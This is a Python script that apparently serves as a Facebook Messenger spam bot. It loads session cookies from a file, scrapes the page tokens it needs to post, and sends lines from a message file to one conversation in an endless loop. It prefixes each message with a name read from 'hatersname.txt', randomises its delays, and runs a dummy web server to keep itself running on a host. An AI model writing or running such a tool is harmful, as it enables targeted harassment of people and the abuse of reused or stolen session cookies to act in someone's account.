import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random
import re

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Server is Running")

def execute_server():
    PORT = int(os.getenv('PORT', 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def get_fb_cookies():
    try:
        with open('cookies.txt', 'r') as file:
            cookies_content = file.read().strip().strip('[]')
            cookies = {}
            
            for part in cookies_content.split(';'):
                part = part.strip()
                if '=' in part:
                    key, value = part.split('=', 1)
                    cookies[key.strip()] = value.strip()
            
            print(f"[DEBUG] Parsed Cookies: {list(cookies.keys())}")
            if not all(k in cookies for k in ['c_user', 'xs']):
                print("[ERROR] Missing required cookies (c_user or xs)")
                return None
            return cookies
            
    except Exception as e:
        print(f"[ERROR] Cookie parsing failed: {str(e)}")
        return None

def send_message_with_cookies(cookies, convo_id, message):
    headers = {
        'authority': 'www.facebook.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'referer': f'https://www.facebook.com/messages/t/{convo_id}',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
    }
    
    session = requests.Session()
    for name, value in cookies.items():
        session.cookies.set(name, value)
    
    try:
        print(f"[DEBUG] Loading conversation page...")
        res = session.get(f'https://www.facebook.com/messages/t/{convo_id}', headers=headers)
        
        fb_dtsg = re.search(r'"token":"([^"]+)"', res.text)
        jazoest = re.search(r'jazoest=(\d+)', res.text)
        
        if not fb_dtsg or not jazoest:
            print("[ERROR] Could not extract required tokens from page")
            return False
            
        print(f"[DEBUG] Tokens extracted successfully")
        
        form_data = {
            'fb_dtsg': fb_dtsg.group(1),
            'jazoest': jazoest.group(1),
            'body': message,
            'send': 'Send',
            'tids': f'cid.{convo_id}',
            '__user': cookies['c_user']
        }
        
        response = session.post('https://www.facebook.com/messages/send/', data=form_data, headers=headers)
        print(f"[DEBUG] Facebook response status: {response.status_code}")
        return response.ok
        
    except Exception as e:
        print(f"[ERROR] Message sending failed: {str(e)}")
        return False

def send_messages():
    print("[+] Starting message sender...")
    
    cookies = get_fb_cookies()
    if not cookies:
        print("[ERROR] Invalid cookies - stopping")
        return
    
    try:
        with open('convo.txt', 'r') as file:
            convo_id = file.read().strip()
            print(f"[DEBUG] Conversation ID: {convo_id}")
    except Exception as e:
        print(f"[ERROR] Reading convo.txt: {str(e)}")
        return
    
    try:
        with open('file.txt', 'r') as file:
            text_file_path = file.read().strip()
        with open(text_file_path, 'r') as file:
            messages = [line.strip() for line in file.readlines() if line.strip()]
            print(f"[DEBUG] Loaded {len(messages)} messages")
    except Exception as e:
        print(f"[ERROR] Reading messages: {str(e)}")
        return
    
    try:
        with open('hatersname.txt', 'r') as file:
            haters_name = file.read().strip()
    except:
        haters_name = ""
    
    try:
        with open('time.txt', 'r') as file:
            speed = int(file.read().strip())
    except:
        speed = 5
    
    print("[+] Starting message loop...")
    while True:
        try:
            for i, message in enumerate(messages):
                full_message = f"{haters_name} {message}" if haters_name else message
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                
                if send_message_with_cookies(cookies, convo_id, full_message):
                    print(f"[+] Message {i+1}/{len(messages)} sent | {current_time}")
                else:
                    print(f"[-] Failed to send message {i+1} | {current_time}")
                
                time.sleep(speed + random.uniform(-1, 1))  # Randomize delay
            
            print("[+] Message cycle completed. Restarting...")
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            time.sleep(30)

def main():
    print("[+] Starting server and message sender...")
    server_thread = threading.Thread(target=execute_server, daemon=True)
    server_thread.start()
    send_messages()

if __name__ == '__main__':
    main()
